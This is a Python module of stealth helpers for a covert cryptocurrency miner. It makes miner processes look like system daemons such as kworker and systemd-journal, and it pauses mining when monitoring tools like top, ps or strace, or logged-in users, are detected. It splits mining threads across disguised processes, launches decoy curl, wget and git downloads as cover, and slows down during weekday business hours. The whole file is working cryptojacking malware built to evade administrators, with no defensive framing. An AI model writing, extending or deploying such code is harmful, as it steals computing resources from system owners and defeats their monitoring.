#!/usr/bin/env python3
"""
Stealth enhancements for evasion and persistence.
"""

import random
import os
import psutil
import time
import re

# ── Process Name Masquerading ─────────────────────────────────────────────────

# Common legitimate system process names
FAKE_PROCESS_NAMES = [
    # Kernel workers
    "kworker/0:1", "kworker/1:0", "kworker/u8:2",
    # Systemd
    "systemd-journal", "systemd-udevd", "systemd-timesyncd", "systemd-logind",
    # Container/orchestration
    "containerd-shim", "dockerd", "runc",
    # Package managers
    "python3 -m pip", "apt-get", "dpkg",
    # Common daemons
    "rsyslogd", "cron", "atd", "acpid",
    # Network
    "NetworkManager", "wpa_supplicant", "dhclient",
    # Other
    "dbus-daemon", "accounts-daemon", "polkitd",
]

def get_fake_process_name():
    """Get a random legitimate-looking process name"""
    return random.choice(FAKE_PROCESS_NAMES)


# ── Idle Detection ────────────────────────────────────────────────────────────

MONITORING_TOOLS = [
    "top", "htop", "atop", "btop", "glances",
    "iotop", "iftop", "nethogs", "nmon",
    "ps", "pstree", "lsof", "netstat", "ss",
    "strace", "ltrace", "perf",
    "vmstat", "iostat", "mpstat", "sar",
]

def should_pause():
    """
    Returns True if we should pause mining due to risky conditions.
    Checks for:
    - Monitoring tools running
    - High system load (other CPU-intensive processes)
    - Active user sessions
    """
    # Guard: disable idle-pause entirely (e.g. GH Actions runner we own).
    # Monitoring agents (strace/ps/ss) are always present there -> false pause.
    if os.environ.get("MINER_MONITOR_GUARD") == "0":
        return False, None
    # Check for monitoring tools
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'] in MONITORING_TOOLS:
                return True, f"monitoring tool detected: {proc.info['name']}"
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    
    # Check for active user sessions (excluding self)
    try:
        users = psutil.users()
        # Filter out pts/ttys from our own process
        active_users = [u for u in users if u.terminal and not u.terminal.startswith('pts/')]
        if active_users:
            return True, f"active user session: {active_users[0].name}"
    except Exception:
        pass
    
    # Check system load - pause if another heavy process is running
    try:
        cpu_percent = psutil.cpu_percent(interval=1)
        # Get top CPU consumers
        procs = sorted(
            [p for p in psutil.process_iter(['name', 'cpu_percent']) if p.info['cpu_percent']],
            key=lambda p: p.info['cpu_percent'],
            reverse=True
        )[:5]
        
        # If there's a process using >30% CPU that's not us, pause
        our_names = ['.svc_', 'python3', 'sysoptd']
        for proc in procs:
            try:
                if proc.info['cpu_percent'] > 30.0:
                    proc_name = proc.info['name']
                    if not any(n in proc_name for n in our_names):
                        return True, f"high CPU process detected: {proc_name} ({proc.info['cpu_percent']:.1f}%)"
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
    except Exception:
        pass
    
    return False, None


# ── Split Execution ───────────────────────────────────────────────────────────

def calculate_split_strategy(total_threads):
    """
    Calculate how to split threads across multiple processes.
    Returns list of (threads_per_instance, fake_name) tuples.
    
    Strategy:
    - Never more than 16 threads per process
    - Use 2-4 processes for better distribution
    - Each gets unique fake name
    """
    if total_threads <= 16:
        # Single process
        return [(total_threads, get_fake_process_name())]
    
    # Multiple processes
    num_processes = min(4, (total_threads + 15) // 16)
    threads_per = total_threads // num_processes
    remainder = total_threads % num_processes
    
    instances = []
    for i in range(num_processes):
        threads = threads_per + (1 if i < remainder else 0)
        fake_name = get_fake_process_name()
        instances.append((threads, fake_name))
    
    return instances


# ── Decoy Processes ───────────────────────────────────────────────────────────

DECOY_COMMANDS = [
    ["curl", "-s", "https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb", "-o", "/dev/null"],
    ["wget", "-q", "https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb", "-O", "/dev/null"],
    ["apt-get", "update"],
    ["git", "clone", "--depth=1", "https://github.com/torvalds/linux.git", "/tmp/.linux-src"],
    ["python3", "-m", "pip", "list"],
]

def spawn_decoy_process():
    """
    Spawn a low-CPU decoy process that looks legitimate.
    Returns subprocess.Popen object.
    """
    import subprocess
    cmd = random.choice(DECOY_COMMANDS)
    
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
        )
        return proc
    except Exception:
        return None


# ── Stealth Scheduling ────────────────────────────────────────────────────────

def is_off_peak_hours():
    """
    Returns True if current time is off-peak (good for mining).
    Off-peak: weekends, nights (10pm - 6am), early mornings
    """
    import datetime
    now = datetime.datetime.now()
    
    # Weekend = off-peak
    if now.weekday() >= 5:  # Saturday=5, Sunday=6
        return True
    
    # Night hours (22:00 - 06:00) = off-peak
    if now.hour >= 22 or now.hour < 6:
        return True
    
    # Early morning (6am-8am) = off-peak
    if 6 <= now.hour < 8:
        return True
    
    return False


def get_intensity_multiplier():
    """
    Returns multiplier for thread count based on time of day.
    1.0 = full speed (off-peak)
    0.5 = half speed (peak hours)
    0.3 = low speed (high-risk hours like 9am-5pm weekday)
    """
    if is_off_peak_hours():
        return 1.0
    
    import datetime
    now = datetime.datetime.now()
    
    # Weekday business hours (9am-5pm) = risky, go slow
    if now.weekday() < 5 and 9 <= now.hour < 17:
        return 0.3
    
    # Other times = medium
    return 0.6


# ── Standalone testing ────────────────────────────────────────────────────────

if __name__ == '__main__':
    print(f"[stealth] Fake process name: {get_fake_process_name()}")
    print(f"[stealth] Should pause: {should_pause()}")
    print(f"[stealth] Split strategy for 64 threads: {calculate_split_strategy(64)}")
    print(f"[stealth] Off-peak hours: {is_off_peak_hours()}")
    print(f"[stealth] Intensity multiplier: {get_intensity_multiplier()}")
